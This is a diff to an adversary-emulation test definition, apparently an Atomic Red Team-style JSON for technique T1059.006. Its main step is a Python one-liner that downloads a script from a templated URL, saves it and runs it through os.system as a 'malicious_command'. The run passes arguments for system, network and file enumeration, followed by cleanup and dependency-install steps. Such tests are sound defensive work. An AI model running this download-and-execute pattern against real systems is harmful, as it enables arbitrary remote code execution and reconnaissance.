@@ -7,87 +7,87 @@
   ],
   "steps": [
     {
-      "id": "f5b137e2-2420-4577-ab14-73d57b82c401",
+      "id": "0429c6d8-311f-46c4-8e27-70b453185d23",
       "type": "execute-command",
       "data": {
-        "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c 'import requests;import os;url = \"#{script_url}\";malicious_command = \"#{executor} #{payload_file_name} #{script_args}\";session = requests.session();source = session.get(url).content;fd = open(\"#{payload_file_name}\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'\n",
+        "command": "which_python=$(which python || which python3 || which python3.9 || which python2)\n$which_python -c 'import requests;import os;url = \"#{script_url}\";malicious_command = \"#{executor} #{payload_file_name} #{script_args}\";session = requests.session();source = session.get(url).content;fd = open(\"#{payload_file_name}\", \"wb+\");fd.write(source);fd.close();os.system(malicious_command)'",
         "command_type": "sh"
       },
       "elevation_required": false
     },
     {
-      "id": "3e4fe51b-13c3-4ce4-96f6-e82496950bf6",
+      "id": "a6756470-ebb2-4751-96f5-cc8f55ad92de",
       "type": "execute-command",
       "data": {
-        "command": "rm #{payload_file_name} \n",
+        "command": "rm #{payload_file_name}",
         "command_type": "sh"
       },
       "elevation_required": false
     },
     {
-      "id": "c859e0a6-76fa-4e57-bfd3-e400238c42c0",
+      "id": "f28ac0fe-5507-4cfe-a4b9-fed06f6038a9",
       "name": "Check dependency 1/1",
       "description": "Verify if python is in the environment variable path and attempt to import requests library.",
       "type": "execute-command",
       "data": {
-        "command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2\u003e/dev/null; echo $?\n",
-        "command_type": ""
+        "command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2\u003e/dev/null; echo $?",
+        "command_type": "sh"
       },
       "elevation_required": false
     },
     {
-      "id": "a04d069a-b2c5-405d-a328-44b8f2f35239",
+      "id": "ff4bc0a2-cee8-409d-bdce-0539744aeb38",
       "name": "Resolve dependency 1/1",
       "description": "Verify if python is in the environment variable path and attempt to import requests library.",
       "type": "execute-command",
       "data": {
-        "command": "pip install requests\n",
-        "command_type": ""
+        "command": "pip install requests",
+        "command_type": "sh"
       },
       "elevation_required": false
     },
     {
-      "id": "ecdf4b94-7529-4f2e-850b-f98761389418",
+      "id": "a40b8df5-7afd-4cdc-a655-1fab57f2c539",
       "name": "Re-check dependency 1/1",
       "description": "Verify if python is in the environment variable path and attempt to import requests library.",
       "type": "execute-command",
       "data": {
-        "command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2\u003e/dev/null; echo $?\n",
-        "command_type": ""
+        "command": "which_python=$(which python || which python3 || which python3.9 || which python2); $which_python -V\n$which_python -c 'import requests' 2\u003e/dev/null; echo $?",
+        "command_type": "sh"
       },
       "elevation_required": false
     }
   ],
   "flows": [
     {
-      "s": "f5b137e2-2420-4577-ab14-73d57b82c401",
+      "s": "0429c6d8-311f-46c4-8e27-70b453185d23",
       "p": "on-success",
-      "o": "3e4fe51b-13c3-4ce4-96f6-e82496950bf6"
+      "o": "a6756470-ebb2-4751-96f5-cc8f55ad92de"
     },
     {
-      "s": "f5b137e2-2420-4577-ab14-73d57b82c401",
+      "s": "0429c6d8-311f-46c4-8e27-70b453185d23",
       "p": "on-failure",
-      "o": "3e4fe51b-13c3-4ce4-96f6-e82496950bf6"
+      "o": "a6756470-ebb2-4751-96f5-cc8f55ad92de"
     },
     {
-      "s": "c859e0a6-76fa-4e57-bfd3-e400238c42c0",
+      "s": "f28ac0fe-5507-4cfe-a4b9-fed06f6038a9",
       "p": "on-success",
-      "o": "f5b137e2-2420-4577-ab14-73d57b82c401"
+      "o": "0429c6d8-311f-46c4-8e27-70b453185d23"
     },
     {
-      "s": "c859e0a6-76fa-4e57-bfd3-e400238c42c0",
+      "s": "f28ac0fe-5507-4cfe-a4b9-fed06f6038a9",
       "p": "on-failure",
-      "o": "a04d069a-b2c5-405d-a328-44b8f2f35239"
+      "o": "ff4bc0a2-cee8-409d-bdce-0539744aeb38"
     },
     {
-      "s": "a04d069a-b2c5-405d-a328-44b8f2f35239",
+      "s": "ff4bc0a2-cee8-409d-bdce-0539744aeb38",
       "p": "on-success",
-      "o": "ecdf4b94-7529-4f2e-850b-f98761389418"
+      "o": "a40b8df5-7afd-4cdc-a655-1fab57f2c539"
     },
     {
-      "s": "ecdf4b94-7529-4f2e-850b-f98761389418",
+      "s": "a40b8df5-7afd-4cdc-a655-1fab57f2c539",
       "p": "on-failure",
-      "o": "f5b137e2-2420-4577-ab14-73d57b82c401"
+      "o": "0429c6d8-311f-46c4-8e27-70b453185d23"
     }
   ],
   "tags": [
@@ -95,18 +95,6 @@
     "T1059.006"
   ],
   "input_arguments": [
-    {
-      "name": "executor",
-      "type": "string",
-      "description": "FreeBSD or Linux shell",
-      "value": "sh"
-    },
-    {
-      "name": "script_args",
-      "type": "string",
-      "description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files.",
-      "value": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
-    },
     {
       "name": "script_url",
       "type": "string",
@@ -118,6 +106,18 @@
       "type": "string",
       "description": "Name of shell script downloaded from the script_url",
       "value": "T1059.006-payload"
+    },
+    {
+      "name": "executor",
+      "type": "string",
+      "description": "FreeBSD or Linux shell",
+      "value": "sh"
+    },
+    {
+      "name": "script_args",
+      "type": "string",
+      "description": "Arguments to check for system stats, available software, process details, environment paths, open sockets, and interesting files.",
+      "value": "-q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"
     }
   ]
 }
